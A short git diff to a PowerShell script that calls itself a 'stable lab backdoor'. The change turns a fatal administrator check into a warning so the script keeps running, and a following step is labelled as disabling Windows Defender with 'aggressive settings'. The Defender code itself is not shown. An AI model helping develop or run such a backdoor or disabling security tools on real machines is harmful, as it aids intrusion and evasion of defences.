@@ -5,9 +5,9 @@ Write-Host "[*] Starting stable lab backdoor..." -ForegroundColor Cyan
 
 # Admin check
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Write-Host "[-] Run as Administrator!" -ForegroundColor Red
-    pause; exit
-}
+    Write-Host "[-] Not running as Administrator. Some features will be skipped." -ForegroundColor Yellow
+} else {
+    Write-Host "[+] Running with Administrator privileges" -ForegroundColor Green
 
 # 1. Defender Disable (keep previous aggressive settings)
 Write-Host "[+] Disabling Defender..." -ForegroundColor Green
